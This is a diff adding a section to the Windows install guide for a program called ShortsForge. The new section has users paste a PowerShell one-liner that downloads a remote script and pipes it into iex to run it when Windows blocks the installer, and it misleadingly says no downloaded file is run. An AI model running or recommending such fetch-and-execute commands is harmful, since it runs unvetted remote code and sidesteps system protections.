@@ -14,6 +14,15 @@ SHORTSFORGE - HOW TO INSTALL (Windows 10 or 11)
 You can delete the downloaded ZIP and this folder after installing.
 
 
+IF WINDOWS BLOCKS IT
+--------------------
+Click Start, type PowerShell, open it, paste this line and press Enter:
+
+  irm https://raw.githubusercontent.com/asadpuremarketing-wq/Shortsforge/main/tools/install.ps1 | iex
+
+It installs the same way without running any downloaded file.
+
+
 UPDATES
 -------
 Nothing to do. Every time you start ShortsForge it checks for a new version
